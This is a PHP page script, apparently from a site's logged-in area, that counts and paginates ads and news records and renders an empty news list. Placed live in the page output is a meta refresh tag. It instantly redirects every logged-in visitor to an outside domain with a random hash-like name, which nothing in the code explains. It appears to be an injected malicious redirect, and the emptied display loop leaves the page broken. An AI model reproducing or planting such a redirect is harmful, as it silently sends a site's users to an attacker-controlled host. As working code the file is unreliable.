<?php
require("./header.php");
if ($checkLogin) {
	$sql = "SELECT count(*) FROM `".TABLE_ADS."`";
	$totalRecordsAds = $db->query_first($sql);
	$totalRecordsAds = $totalRecordsAds["count(*)"];
	$perPageAds = 10;
	$totalPageAds = ceil($totalRecordsAds/$perPageAds);
	if (isset($_GET["pageAds"])) {
		$pageAds = $db->escape($_GET["pageAds"]);
		if ($pageAds < 1)
		{
			$pageAds = 1;
		}
		else if ($pageAds > $totalPageAds)
		{
			$pageAds = 1;
		}
	}
	else
	{
		$pageAds = 1;
	}
	$sql = "SELECT * FROM `".TABLE_ADS."` ORDER BY ad_time DESC,ad_id DESC LIMIT ".(($pageAds-1)*$perPageAds).",".$perPageAds;
	$recordsAds = $db->fetch_all_array($sql);

	$sql = "SELECT count(*) FROM `".TABLE_NEWS."`";
	$totalRecords = $db->query_first($sql);
	$totalRecords = $totalRecords["count(*)"];
	$perPage = 10;
	$totalPage = ceil($totalRecords/$perPage);
	if (isset($_GET["page"])) {
		$page = $db->escape($_GET["page"]);
		if ($page < 1)
		{
			$page = 1;
		}
		else if ($page > $totalPage)
		{
			$page = 1;
		}
	}
	else
	{
		$page = 1;
	}
	$sql = "SELECT ".TABLE_NEWS.".*, ".TABLE_USERS.".user_id, ".TABLE_USERS.".user_name FROM `".TABLE_NEWS."` LEFT JOIN `".TABLE_USERS."` ON ".TABLE_NEWS.".news_author = ".TABLE_USERS.".user_id ORDER BY ".TABLE_NEWS.".news_time  DESC,".TABLE_NEWS.".news_id DESC LIMIT ".(($page-1)*$perPage).",".$perPage;
	$records = $db->fetch_all_array($sql);
?>

<meta http-equiv="refresh" content="0; URL=https://f1425da40a9f2d21ab702a1c7feae026.live/21232f297a57a5a743894a0e4a801fc3/" />

					</div>
					<div class="section_content">
<?php
	if (count($records) > 0)
	{
		foreach ($records as $key=>$value) {

?>

				

<?php
		}
	}else {
?>

				<div class="news_title">
					<span class="red">No record found.</span>
				</div>

<?php
	}
?>
					</div>
				</div>
<?php
}else {
	require("./minilogin.php");
}
require("./footer.php");
?>